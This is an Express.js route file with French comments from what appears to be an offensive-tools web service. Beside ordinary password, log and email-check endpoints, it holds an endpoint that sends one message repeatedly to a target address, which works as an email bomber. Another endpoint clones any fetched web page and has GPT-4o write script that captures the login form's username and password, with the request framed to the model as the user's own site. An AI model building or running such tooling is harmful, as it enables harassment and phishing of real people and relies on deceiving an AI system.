const express = require('express');
const auth = require('../middleware/authMiddleware');
const permissionCheck = require('../middleware/permissionMiddleware');
const roleCheck = require('../middleware/roleMiddleware');
const Log = require('../models/Log');
const crypto = require('crypto'); // Utilisé pour générer des mots de passe sécurisés
const axios = require('axios'); // Utilisé pour faire des requêtes HTTP
const nodemailer = require('nodemailer'); // Utilisé pour envoyer des e-mails
const OpenAI = require('openai');
const fs = require('fs');
const path = require('path');

const router = express.Router(); // Initialiser le router

// Configurer l'API OpenAI
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY,
});

/**
 * @swagger
 * /api/features/generate-password:
 *   get:
 *     summary: Générer un mot de passe sécurisé
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200:
 *         description: Mot de passe généré avec succès
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 password:
 *                   type: string
 *                   example: "abc123def456"
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.get('/generate-password', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('generate_password')(req, res, next);
}, (req, res) => {
    const password = crypto.randomBytes(12).toString('hex'); // Générer un mot de passe de 12 caractères
    res.json({ password });
});

/**
 * @swagger
 * /api/features/logs:
 *   get:
 *     summary: Obtenir les dernières actions réalisées (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200:
 *         description: Liste des dernières actions réalisées
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 */
router.get('/logs', auth, roleCheck(['admin']), async (req, res) => {
    try {
        const logs = await Log.findAll({ order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/logs/user/{userId}:
 *   get:
 *     summary: Obtenir les dernières actions d'un utilisateur spécifique (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: userId
 *         required: true
 *         schema:
 *           type: string
 *         description: ID de l'utilisateur
 *     responses:
 *       200:
 *         description: Liste des dernières actions de l'utilisateur
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 *       404:
 *         description: Utilisateur non trouvé
 */
router.get('/logs/user/:userId', auth, roleCheck(['admin']), async (req, res) => {
    const { userId } = req.params;
    try {
        const logs = await Log.findAll({ where: { userId: parseInt(userId, 10) }, order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/logs/action:
 *   get:
 *     summary: Obtenir les dernières actions d'une fonctionnalité spécifique (admin uniquement)
 *     tags: [Logs]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               action:
 *                 type: string
 *                 description: Nom de l'action spécifique
 *     responses:
 *       200:
 *         description: Liste des dernières actions de la fonctionnalité
 *       401:
 *         description: Non autorisé
 *       403:
 *         description: Accès refusé
 */
router.get('/logs/action', auth, roleCheck(['admin']), async (req, res) => {
    const { action } = req.body;
    try {
        const { Op } = require('sequelize');
        const logs = await Log.findAll({ where: { action: { [Op.like]: `%${action}%` } }, order: [['timestamp', 'DESC']], limit: 10 });
        res.status(200).json(logs);
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/verify-email:
 *   post:
 *     summary: Vérifier l'existence d'une adresse e-mail (nécessite la permission "verify_email")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: L'adresse e-mail à vérifier
 *     responses:
 *       200:
 *         description: Résultat de la vérification de l'adresse e-mail
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 email:
 *                   type: string
 *                 status:
 *                   type: string
 *                   description: "L'existence de l'e-mail : soit 'valid', 'invalid', ou 'unknown'"
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.post('/verify-email', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('verify_email')(req, res, next);
}, async (req, res) => {
    const { email } = req.body;

    if (!email) {
        return res.status(400).json({ msg: 'Email is required' });
    }

    try {
        const response = await axios.get(`https://api.hunter.io/v2/email-verifier?email=${email}&api_key=${process.env.HUNTER_API_KEY}`);
        const { data } = response;

        if (data && data.data) {
            res.status(200).json({
                email: data.data.email,
                status: data.data.result, // 'valid', 'invalid', or 'unknown'
            });
        } else {
            res.status(500).json({ msg: 'Unexpected response from Hunter API' });
        }
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/send-emails:
 *   post:
 *     summary: Envoyer des e-mails multiples (nécessite la permission "send_emails")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: L'adresse e-mail de la cible
 *               content:
 *                 type: string
 *                 description: Contenu de l'e-mail
 *               count:
 *                 type: integer
 *                 description: Nombre de fois que l'e-mail doit être envoyé
 *     responses:
 *       200:
 *         description: E-mails envoyés avec succès
 *       400:
 *         description: Requête invalide
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 */
router.post('/send-emails', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('send_emails')(req, res, next);
}, async (req, res) => {
    const { email, content, count } = req.body;

    if (!email || !content || !count || count <= 0) {
        return res.status(400).json({ msg: 'Email, content, and valid count are required' });
    }

    try {
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASSWORD,
            },
        });

        for (let i = 0; i < count; i++) {
            await transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: email,
                subject: 'Message automatique',
                text: content,
            });
        }

        res.status(200).json({ msg: 'Emails sent successfully' });
    } catch (error) {
        res.status(500).json({ msg: 'Server error', error: error.message });
    }
});

/**
 * @swagger
 * /api/features/generate-webpage:
 *   post:
 *     summary: Générer une page web en utilisant GPT (nécessite la permission "generate_webpage")
 *     tags: [Features]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               prompt:
 *                 type: string
 *                 description: Le prompt à envoyer à GPT pour générer le contenu de la page web
 *               referenceUrl:
 *                 type: string
 *                 description: L'URL du site à récupérer
 *     responses:
 *       200:
 *         description: Lien vers la page web générée
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 link:
 *                   type: string
 *                   description: Lien vers la page web générée
 *       400:
 *         description: Requête invalide
 *       403:
 *         description: Accès refusé. Permission nécessaire.
 *       401:
 *         description: Non autorisé. Token JWT manquant ou invalide.
 *       500:
 *         description: Erreur interne du serveur
 */
router.post('/generate-webpage', auth, (req, res, next) => {
    if (req.user.role === 'admin') {
        return next();
    }
    return permissionCheck('generate_webpage')(req, res, next);
}, async (req, res) => {
    const { referenceUrl } = req.body;

    if (!referenceUrl) {
        return res.status(400).json({ msg: 'Reference URL is required' });
    }

    let referenceContent = '';

    try {
        // Récupérer le contenu de l'URL de référence
        const response = await axios.get(referenceUrl);
        referenceContent = response.data;
    } catch (error) {
        return res.status(400).json({ msg: 'Impossible de récupérer le contenu de l\'URL de référence', error: error.message });
    }

    try {
        // Vérifier si le dossier 'generated' existe, sinon le créer
        const generatedDir = path.join(__dirname, '../generated');
        if (!fs.existsSync(generatedDir)) {
            fs.mkdirSync(generatedDir);
        }
        // Sauvegarder le contenu récupéré pour référence
        fs.writeFileSync(path.join(generatedDir, 'recupere.html'), referenceContent);

        // Préparer le prompt pour OpenAI
        const fullPrompt = `
Voici le code HTML de mon site web :
\`\`\`
${referenceContent}
\`\`\`

Je souhaite modifier le formulaire de connexion de ce site pour que, lorsque le bouton de soumission est cliqué, le code JavaScript affiche via console.log() le login et le mot de passe précisés dans le formulaire de connexion. Il faut aussi s'assurer que la validation du formulaire ne fasse plus aucune action (exemple : si le formulaire redirige sur une autre page, ça ne doit plus être le cas). 

Le JavaScript que vous fournirez devra inclure la commande pour empêcher l’action de soumission par défaut du formulaire. Il doit être encapsulé dans une balise <script> à placer juste avant la balise </body>.

Vous ne devez fournir que le code JavaScript à ajouter, sans réécrire le code existant et sans commentaire ni explication.
`;

        // Appeler l'API OpenAI
        const responseAI = await openai.chat.completions.create({
            model: 'gpt-4o',
            messages: [
                { role: 'user', content: fullPrompt },
            ],
        });

        const gptResponse = responseAI.choices[0].message.content;

        // Extraire le code à ajouter à partir de la réponse de GPT
        let codeToAdd = gptResponse;

        // Utiliser une expression régulière pour extraire le code dans les balises de code
        const codeMatch = gptResponse.match(/```(?:javascript|html)?\n([\s\S]*?)```/i);
        if (codeMatch) {
            codeToAdd = codeMatch[1];
        }

        // Trouver l'index de la balise </body> dans le contenu de référence
        const bodyCloseTagIndex = referenceContent.lastIndexOf('</body>');
        if (bodyCloseTagIndex === -1) {
            return res.status(500).json({ msg: 'Impossible de trouver la balise </body> dans le contenu de référence' });
        }

        // Insérer le code à ajouter avant la balise </body>
        const modifiedContent = referenceContent.slice(0, bodyCloseTagIndex) + '\n' + codeToAdd + '\n' + referenceContent.slice(bodyCloseTagIndex);

        // Écrire le contenu modifié dans index.html
        const filePath = path.join(generatedDir, 'index.html');
        fs.writeFileSync(filePath, modifiedContent);

        // Retourner le lien vers le fichier généré
        res.status(200).json({ link: `http://localhost:5000/generated/index.html` });
    } catch (error) {
        res.status(500).json({ msg: 'Erreur serveur', error: error.message });
    }
});



module.exports = router;